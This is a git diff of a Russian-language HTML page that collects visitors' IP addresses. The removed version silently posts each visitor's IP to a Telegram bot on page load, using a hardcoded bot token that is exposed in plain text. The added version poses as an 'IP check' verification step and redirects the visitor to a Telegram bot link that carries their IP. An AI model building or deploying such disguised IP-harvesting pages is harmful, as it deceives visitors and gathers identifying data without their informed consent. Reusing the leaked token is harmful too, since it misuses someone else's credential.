@@ -1,41 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Регистрация IP</title>
+    <title>Проверка IP</title>
 </head>
 <body>
-<h2>Отправка IP боту</h2>
-<p>Подождите, идёт отправка IP...</p>
+    <h1>Пройдите проверку</h1>
+    <button onclick="sendIP()">Продолжить</button>
 
-<script>
-async function sendIP() {
-    try {
-        // Получаем IP пользователя
-        const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
-        const ip = data.ip;
+    <script>
+        async function sendIP() {
+            // Получаем IP пользователя
+            const ip = await fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => data.ip);
 
-        // Отправка IP напрямую боту через Bot API
-        const BOT_TOKEN = "8456230167:AAHCaeyIsgjBRaBvZ_4Q29awaUv4Ikd3rzw";
-        const BOT_CHAT_ID = "8456230167"; // Можно использовать ID бота или админа
-
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: BOT_CHAT_ID,
-                text: `IP пользователя: ${ip}`
-            })
-        });
-
-        document.body.innerHTML = "<p>IP успешно отправлен боту!</p>";
-    } catch (err) {
-        console.error(err);
-        document.body.innerHTML = "<p>Ошибка при отправке IP.</p>";
-    }
-}
-
-sendIP();
-</script>
+            // Перенаправляем в бота с deep link
+            window.location.href = `https://t.me/Logochoose_bot?start=${ip}`;
+        }
+    </script>
 </body>
 </html>
